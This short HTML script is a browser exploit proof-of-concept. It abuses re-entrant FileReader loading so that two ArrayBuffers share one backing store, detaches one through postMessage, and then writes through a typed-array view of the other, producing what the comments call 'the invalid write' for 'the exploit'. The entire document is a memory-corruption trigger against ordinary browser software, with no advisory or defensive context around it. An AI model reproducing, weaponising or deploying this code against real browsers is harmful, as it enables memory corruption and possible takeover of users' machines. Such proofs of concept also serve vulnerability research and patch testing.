<script>
{
  const reader = new FileReader;
  reader.onprogress = function() { 
    const buf1 = reader.result;
    const buf2 = reader.result;
    // Usually, these are the same ArrayBuffer, but every once in awhile
    // they're different! Yet they still point to the same backing store.
    if (buf1 !== buf2) {
      try {
        // postMessage will detach buf1.
        // "J" is an invalid origin, thus the need for try/catch.
        window.postMessage([buf1], "J", [buf1]);
      } catch { }
      let view = new Uint32Array(buf2);
	Math.cos(1);
      // This is the invalid write.
      view[0] = 1048576;
    }
  };
  reader.onload = function() {
    // This seems to be where things go wrong. adamk suspects
    // re-entrancy problems.
    reader.readAsArrayBuffer(new Blob([1, 2, 3, 4]));
  };
  // This just kicks off the machinery operation;
  // the fact that it's an empty blob is not important to the exploit.
  reader.readAsArrayBuffer(new Blob());
}
</script>
